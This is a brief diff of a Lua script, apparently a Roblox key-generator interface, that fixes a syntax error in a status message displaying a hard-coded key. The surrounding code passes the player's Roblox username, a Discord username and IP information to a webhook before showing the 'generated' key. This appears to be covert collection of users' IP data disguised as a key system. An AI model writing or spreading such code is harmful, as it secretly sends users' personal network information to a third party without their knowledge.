@@ -168,7 +168,7 @@ Main = (function()
       local robloxUsername = plr.Name
       Webhook.Send(robloxUsername, discordUsername, ipInfo)
       
-      statusLabel.Text = "Key Generated, Your key is TFB_1A5GN0@LK#fFpTL!@S")
+      statusLabel.Text = "Key Generated, Your key is TFB_1A5GN0@LK#fFpTL!@S"
       task.wait(4)
       screenGui:Destroy()
     end)
